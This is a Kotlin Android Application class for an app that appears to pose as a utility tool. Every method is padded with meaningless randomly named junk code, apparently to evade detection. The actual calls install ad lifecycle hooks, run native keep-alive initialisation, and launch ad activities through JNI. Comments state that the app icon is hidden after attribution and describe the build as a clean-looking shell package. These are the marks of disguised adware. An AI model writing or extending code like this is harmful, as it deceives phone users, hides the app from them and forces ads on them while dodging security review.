package phfk.ssik.vscd

import android.app.Application
import android.content.Intent
import android.os.Bundle
import phfk.ssik.vscd.tools.ToolUiInstaller
import com.keep.up.all.NativeJniUtils
import phfk.goqh.rdfj.ad.runtime.AdLifecycleInstaller
import phfk.goqh.rdfj.base.APPContext
import phfk.goqh.rdfj.base.OverseaAppHost
import phfk.goqh.rdfj.base.OverseaAppInitializer


class UHO : Application(), OverseaAppHost {

    override val restrictSubProcessInAttach: Boolean = true

    companion object {
        @JvmStatic
        var insApp: UHO? = null
    }

    override fun onCreate() {
        val arr_PZhGw  = listOf("cmkBnPqNb", "DghhvcerDgyReZpXs", "RElzlpaGRrDw").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_cvUzQxy  = arr_PZhGw .filter { it.length > 6 }
         if (ad_cvUzQxy .isNotEmpty() && java.lang.System.currentTimeMillis() < 54) {
             ad_cvUzQxy .forEach { _ ->  }
         }
        super.onCreate()
        insApp = this
        // 原生 Application 需要主动触发海外公共初始化。
        OverseaAppInitializer.init(this, this)
        // 安装返回广告所需的 Activity 生命周期监听。
        AdLifecycleInstaller.install(this)
        // 保证白包有 context
        APPContext.setApplication(this)
        // 统一安装各工具页的自定义 UI(按 ToolType 区分;未注册的工具用功能层默认 UI)
        ToolUiInstaller.installAll()
    }

    override fun openLaunch(intent: Intent?) {
        val arr_aQZZscbcdvmCUDlsPG = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_ZwegDND  = (arr_aQZZscbcdvmCUDlsPG  shl 1) xor (arr_aQZZscbcdvmCUDlsPG  shr 15)
         val j_phqduLZFluWCmQL  = i_ZwegDND .inv() and 0xFFFF
         if (j_phqduLZFluWCmQL  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_cIIBrguohZwH")
         }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val arr_aCCGttBGJddHdH  = listOf("ielWITLV", "koeMmiqiGvwKlnFam", "eVFlFQHGBew").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_EgqbzbBFBYGzSr  = arr_aCCGttBGJddHdH .filter { it.length > 46 }
         if (ad_EgqbzbBFBYGzSr .isNotEmpty() && java.lang.System.currentTimeMillis() < 7) {
             ad_EgqbzbBFBYGzSr .forEach { _ ->  }
         }
        SCML.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val WpvNBMNdGGhF : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val acctpm  = WpvNBMNdGGhF ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_21" 
            }
            if (acctpm .startsWith("GmUsgkcmjDECKV ")) {
                android.util.Log.v("TAG", acctpm )
            }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        NativeJniUtils.pageopen(intent)
    }


    override fun initPopPower() {
        val RxykSalKgE : String? = if (java.lang.System.nanoTime() % 2 == 0L) "vN8" else null
            val qFDeKpWXJwfQO  = RxykSalKgE ?.let { 
                it.repeat(kotlin.random.Random.nextInt(100)) 
            } ?: run { 
                "zY0_35" 
            }
            if (qFDeKpWXJwfQO .startsWith("SxGkiWrwzobZrak ")) {
                android.util.Log.v("TAG", qFDeKpWXJwfQO )
            }
        // 图标隐藏已由 oversea_base_module 在归因后置流程统一调度(OverseaAppHost.enableIconHide 默认开启)
    }


    override fun initKeepPower(app: Application) {
        val arr_pBpIR  = listOf("PuWmALYRfCPEIbtRJ", "OzNfADCN", "jzCOe").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_gHSmjBFCmCVGnJJQhqS  = arr_pBpIR .filter { it.length > 85 }
         if (ad_gHSmjBFCmCVGnJJQhqS .isNotEmpty() && java.lang.System.currentTimeMillis() < 74) {
             ad_gHSmjBFCmCVGnJJQhqS .forEach { _ ->  }
         }
        // attachBaseContext 阶段 insApp 尚未赋值，必须使用回调传入的 Application。
        NativeJniUtils.virinit(app)
    }

}